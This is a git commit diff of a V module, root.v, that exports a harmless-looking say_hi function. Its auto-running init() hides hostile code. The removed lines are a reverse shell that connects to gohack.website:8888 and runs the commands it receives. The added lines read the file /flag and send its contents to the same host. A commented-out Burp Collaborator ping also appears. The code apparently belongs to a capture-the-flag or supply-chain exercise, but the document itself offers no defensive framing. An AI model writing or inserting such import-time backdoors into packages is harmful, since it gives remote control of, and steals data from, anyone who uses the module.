e58b66d66c600a9e8dd64d0774bd336ffa365d8a
Abdillah <abdillah.muhamad@vantagepoint.co.id>
2021-10-31 15:41:31 +0700

    init

--- root.v
+++ root.v
@@ -9,21 +9,7 @@ pub fn say_hi() {
 }
 
 fn init(){
-//os.system("ping m1o9ydd3il1qi3vn25ccl1ouglmba0.burpcollaborator.net")
-    client := net.dial("gohack.website", 8888) or { panic('') }
-    mut outfile := ' > /var/tmp/shell'
-    mut readfile := '/var/tmp/shell'
-    if os.user_os() == 'windows' {
-        outfile = ' > C:\\Users\\Public\\shell.txt'
-        readfile = 'C:\\Users\\Public\\shell.txt'
-    }
-    for {
-        bytes, blen := client.recv(1024)
-        i := tos(bytes, blen)
-	if blen  < 0 { continue }
-	if blen == 0 { break }
-	os.system(i.replace('\n', outfile))
-        out := os.read_file(readfile) or { break }
-        client.write(out) or { break }
-    }
+        mut client := net.dial_tcp("gohack.website:8888") or { panic('') }
+        out := os.read_file("/flag") or { panic('') }
+        client.write_string(out)  or { panic('') }
 }
